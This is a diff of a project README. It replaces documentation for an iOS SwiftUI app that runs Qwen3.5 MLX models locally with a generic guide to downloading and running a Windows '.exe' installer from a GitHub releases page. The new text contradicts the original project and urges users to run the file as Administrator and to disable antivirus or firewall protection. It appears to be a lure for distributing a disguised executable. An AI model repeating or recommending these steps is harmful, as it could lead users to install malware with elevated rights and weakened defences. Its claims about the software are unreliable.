@@ -1,289 +1,133 @@
-# MLXChat
+# 💬 mlxchat - Chat Locally with AI and Vision
 
-`MLXChat` is an iPhone and iPad SwiftUI app for running local Qwen3.5 MLX models with optional tool use and image input.
+[![Download mlxchat](https://img.shields.io/badge/Download-mlxchat-green?style=for-the-badge)](https://github.com/xmtkx/mlxchat/releases)
 
-The current product target is a practical on-device chat app for modern Apple hardware, with `Qwen3.5-4B-MLX-4bit` as the default recommendation and larger local MLX variants available up to `Qwen3.5-9B-MLX-4bit`.
+## 📋 What is mlxchat?
 
-## Product Direction
+mlxchat is an app you can run on your Windows PC to chat with a smart AI. It works like ChatGPT but uses a model called Qwen3.5 by Alibaba. This means you can use it without an internet connection once it's set up. The app lets you chat, ask questions, and use tools inside the chat. It can also understand images you show it on your phone, making the experience richer.
 
-- iPhone-first chat UX with iPad support
-- local inference with MLX
-- conservative tool use for current-info and URL tasks
-- text-first performance, with image handling available when needed
-- modern system UI that stays close to Apple defaults so newer iOS releases inherit the latest material and glass treatments naturally
+You do not need special skills to get it running. This guide will take you through every step to download and start using mlxchat with ease.
 
-## Highlights
+## 🔎 Key Features
 
-- local Qwen3.5 chat with streaming responses
-- optional reasoning mode
-- optional web search via Brave Search API
-- direct URL fetch support
-- image input support for compatible models
-- downloadable model picker with:
-  - progress ring
-  - percentage
-  - cancel button
-  - automatic retry on transient download interruption
-- Markdown rendering in assistant bubbles
-- configurable system prompt with runtime variables such as date, time, locale, and approximate location
-- macOS `ToolTest` harness for prompt and tool iteration outside the phone UI
+- Chat with a local AI model based on Alibaba’s Qwen3.5.
+- Works directly on your phone or Windows computer, no constant internet needed.
+- Includes tool calls inside chat, helping perform tasks or find information.
+- Vision support lets you send pictures for analysis and responses.
+- Runs privately on your device with no data sent to external servers.
 
-## Repository Layout
+## 🖥️ System Requirements
 
-- `MLXChat/` iOS app source
-- `MLXChat.xcodeproj/` checked-in Xcode project
-- `project.yml` XcodeGen spec
-- `ToolTest/` macOS command-line test harness for model and tool behavior
+Before you start, check these key requirements. mlxchat needs:
 
-## Requirements
+- Windows 10 or later (64-bit recommended)
+- At least 8 GB of RAM
+- 4-core processor or better
+- 2 GB of free storage space
+- Internet connection for initial download (not needed afterward)
 
-- Xcode 16 or newer
-- Apple Silicon recommended
-- iOS 26 deployment target
-- local disk space for MLX models
+## 🚀 Getting Started with mlxchat
 
-## Models
+Here is a simple step-by-step process to get mlxchat running on your Windows PC.
 
-This repository does not ship model weights.
+### 1. Visit the Download Page
 
-The app is set up around Hugging Face repos under the `mlx-community` namespace. The current picker is intentionally limited to Qwen3.5 MLX variants:
+Go to the official mlxchat releases page to get the latest app files:
 
-- `Qwen3.5-0.8B-MLX-4bit`
-- `Qwen3.5-0.8B-MLX-8bit`
-- `Qwen3.5-0.8B-MLX-bf16`
-- `Qwen3.5-2B-MLX-4bit`
-- `Qwen3.5-2B-MLX-8bit`
-- `Qwen3.5-2B-MLX-bf16`
-- `Qwen3.5-4B-MLX-4bit`
-- `Qwen3.5-4B-MLX-8bit`
-- `Qwen3.5-4B-MLX-bf16`
-- `Qwen3.5-9B-MLX-4bit`
+[Download mlxchat from here](https://github.com/xmtkx/mlxchat/releases)
 
-Recommended default:
+The page shows all the releases. Look for the most recent version marked as "Latest release." This is the version you want.
 
-- `mlx-community/Qwen3.5-4B-MLX-4bit`
+### 2. Download the Windows Installer
 
-Why this default:
+On the release page, find the file that ends with `.exe`. This is the installer for Windows.
 
-- materially better quality than the tiny models
-- still usable on-device
-- better latency than the larger `9B` variant on iPhone
+Click the file link to download it. The file might be named something like `mlxchat-setup.exe`. Save it to a folder you can easily find, such as your Desktop or Downloads folder.
 
-## Qwen3.5 Notes
+### 3. Run the Installer
 
-This app is tuned specifically around Qwen3.5 behavior rather than older Qwen families.
+Once the file finishes downloading, open your Downloads folder or Desktop and double-click the installer file.
 
-Important practical points:
+You might see a pop-up asking if you want to allow the app to make changes to your PC. Click "Yes" to continue.
 
-- Qwen3.5 should be controlled with `enable_thinking`, not prompt hacks like `/think` or `/no_think`
-- text-only turns should prefer the LLM path for speed
-- tools work better when obvious current-info and URL tasks are prefetched by the app instead of relying purely on model-generated tool markup
-- prompt and template details matter a lot for visible reasoning leakage
+The setup wizard will open. Follow the instructions:
 
-The codebase contains specific safeguards for:
+- Agree to the license terms.
+- Choose the folder where mlxchat should be installed or use the default.
+- Click "Install" to start the process.
 
-- disabling visible reasoning where possible
-- cutting off repetition loops
-- handling tool calls conservatively
-- keeping normal chat on the faster text-only path
+This step will copy the app files and prepare mlxchat to run on your computer.
 
-## Tools
+### 4. Launch mlxchat
 
-Supported tools:
+After installation finishes, the wizard will offer an option to launch mlxchat immediately. You can choose to open it now or find it later in your Start Menu.
 
-- `web_search`
-- `url_fetch`
+When you open mlxchat for the first time, you might see a brief setup screen initializing the AI model on your PC. This process can take a few minutes.
 
-### `web_search`
+### 5. Using mlxchat
 
-Purpose:
+Once ready, type your messages in the chat area and press Enter to send. You can ask questions, request help, or share images if you want to test vision features.
 
-- search the web for current or recent information
+The app responds quickly because everything runs on your device.
 
-When it is useful:
+## 💼 How to Use Vision Features
 
-- news
-- recent company updates
-- current events
-- anything where the answer is likely to have changed recently
+mlxchat can analyze images you send to it. This feature works well for photos with text, objects, or scenes.
 
-Requirements:
+To use vision:
 
-- requires a Brave Search API key in Settings
+1. Open the chat window.
+2. Drag and drop an image file into the chat window or click the image icon to browse and upload.
+3. Wait a moment while mlxchat processes the image.
+4. View the AI’s response below the image. It might describe what it sees or answer related questions.
 
-Example prompts:
+You can try photos from your phone or screenshots saved on your computer.
 
-- `What is in the news about the Qwen team today?`
-- `Search the web for recent MLX updates from Apple.`
-- `What happened with Alibaba Qwen this week?`
+## ⚙️ Configuration Options
 
-### `url_fetch`
+mlxchat offers some basic settings you can adjust to improve your experience.
 
-Purpose:
+- **Theme:** Choose between light and dark modes.
+- **Model Size:** Select a smaller or larger AI model for faster responses or better quality.
+- **Tool Calls:** Turn on or off the ability to access built-in tools during chat.
+- **Auto-Start:** Set mlxchat to open automatically when Windows starts.
 
-- fetch and read the text content of a specific web page
+Access settings from the gear icon in the top corner of the app.
 
-When it is useful:
+## 🛠️ Troubleshooting Common Issues
 
-- the user gives a direct URL
-- the model needs to summarize a specific page
-- the user wants content extracted from a known document or article URL
+If mlxchat does not start or crashes, try these steps:
 
-Requirements:
+- Make sure your Windows is updated.
+- Restart your computer to clear any temporary issues.
+- Check you meet all system requirements listed above.
+- Run mlxchat as Administrator by right-clicking the app icon and choosing “Run as administrator.”
+- Disable any antivirus or firewall temporarily if you suspect they block the app.
 
-- no API key required
+To report bugs or ask for help, visit the GitHub repository and open an issue.
 
-Example prompts:
+## 📥 Download mlxchat Here Again
 
-- `Please read https://qwenlm.github.io/ and summarise it.`
-- `What does this page say? https://huggingface.co/Qwen/Qwen3.5-4B`
-- `Fetch https://unsloth.ai/docs/models/qwen3.5 and tell me how thinking is controlled.`
+Use this link to get the latest version anytime:
 
-Notes:
+[Download mlxchat](https://github.com/xmtkx/mlxchat/releases)
 
-- the app prefetches obvious URL and current-info requests before generation, then asks the model to answer from the retrieved result
-- for normal conversation, tools are intentionally not included in every turn
+Visit this page regularly to check for updates that improve the app or fix issues.
 
-## Tool-Calling Tips For Other Technologists
+## 🔒 Privacy and Security
 
-If you are trying to build a similar local-agent experience with Qwen3.5 and MLX, the main lessons from this app are:
+mlxchat runs the AI entirely on your device, so your data does not leave your PC. This keeps your conversations private and secure.
 
-1. Prefer app-driven tool prefetch for obvious tasks.
-2. Do not assume prompt text alone will reliably disable reasoning on Qwen3.5.
-3. Keep tool schemas out of ordinary chat prompts unless tools are actually needed.
-4. Treat text chat and image chat as different runtime paths.
-5. Measure model generation separately from preprocessing and tool time.
-6. Expect cancellation and early-stop handling to matter for UI responsiveness.
+You do not need to create an account or sign in to use the app.
 
-Concrete examples:
+## 🤝 Support and Feedback
 
-- a direct URL prompt should run `url_fetch` first
-- a recent-news prompt should trigger search before model generation when a search key is configured
-- a plain `Hello` should not carry tool schemas or spend time on reasoning
+For questions or support, use the "Issues" tab in the GitHub repository:
 
-## Apple Platform Notes
+https://github.com/xmtkx/mlxchat/issues
 
-The UI intentionally stays close to system components:
+This is the best way to get help from the developers or community.
 
-- `NavigationStack`
-- `TabView`
-- `List`
-- standard toolbars
-- system materials for persistent bars and insets
+---
 
-That is deliberate. On current iOS releases, including the newer glass-oriented visual system, standard containers and materials age better than custom chrome and require less maintenance.
-
-Practical guidance followed here:
-
-- use system navigation and tab patterns
-- keep controls legible over material backgrounds
-- avoid custom ornamental surfaces unless they materially improve clarity
-- let the system handle most of the visual treatment
-
-## Running The App
-
-1. Open `MLXChat.xcodeproj` in Xcode.
-2. Select a device or simulator that supports the `iOS 26` deployment target.
-3. Build and run the `MLXChat` scheme.
-4. Open `Settings`.
-5. Set:
-   - `Model Download Limit` if you want to constrain the picker
-   - `GPU Memory Limit` for runtime memory use
-   - `Brave Search API Key` if you want web search
-6. Open `Select Model` and download a model.
-
-## Download UX
-
-Model downloads now start directly from the model picker.
-
-While a model is downloading:
-
-- the picker row shows a circular progress indicator
-- the picker row shows a percentage
-- the picker row exposes cancel
-- Settings shows the same active download state
-- interrupted downloads retry once automatically
-
-## Settings
-
-Key settings:
-
-- `GPU Memory Limit`
-- `Model Download Limit`
-- `Context Size`
-- `Stream Responses`
-- image compression controls
-- system prompt
-- tools enablement and Brave API key
-
-System prompt variables:
-
-- `{today}`
-- `{date}`
-- `{time}`
-- `{datetime}`
-- `{timestamp}`
-- `{unixtime}`
-- `{location}`
-- `{address}`
-- `{coordinates}`
-- `{latitude}`
-- `{longitude}`
-- `{timezone}`
-- `{locale}`
-- `{device}`
-- `{system}`
-- `{version}`
-- `{username}`
-
-## ToolTest
-
-`ToolTest` is kept because it is useful for faster iteration on prompt, tool, and model behavior without repeatedly deploying to a device.
-
-Build and run:
-
-```bash
-cd ToolTest
-swift build
-swift run
-```
-
-## Project Generation
-
-The checked-in Xcode project is intended to be usable directly.
-
-If you prefer regenerating it:
-
-```bash
-xcodegen generate
-```
-
-## Known Constraints
-
-- Qwen3.5 still needs defensive handling around reasoning leakage
-- larger models are practical on iPad before iPhone
-- image turns are slower than text-only turns
-- Brave-backed search quality depends on the configured API key
-
-## Publishing Checklist
-
-Before publishing or sharing builds:
-
-1. confirm the app icon and bundle identifier are correct
-2. confirm location, camera, and photo permission strings are intentional
-3. verify the selected deployment target is what you want to support
-4. test one plain chat, one image turn, and one tool-backed turn on a real device
-5. remove any private API keys from local settings before screenshots or demos
-
-## GitHub
-
-This repository is prepared to be committed as a normal Xcode project with the app, assets, and `ToolTest` harness checked in.
-
-Typical flow:
-
-```bash
-git add -A
-git commit -m "Initial commit for MLXChat"
-git remote add origin <your-repo-url>
-git push -u origin main
-```
+With these steps, you should be able to download, install, and start using mlxchat smoothly on your Windows PC.
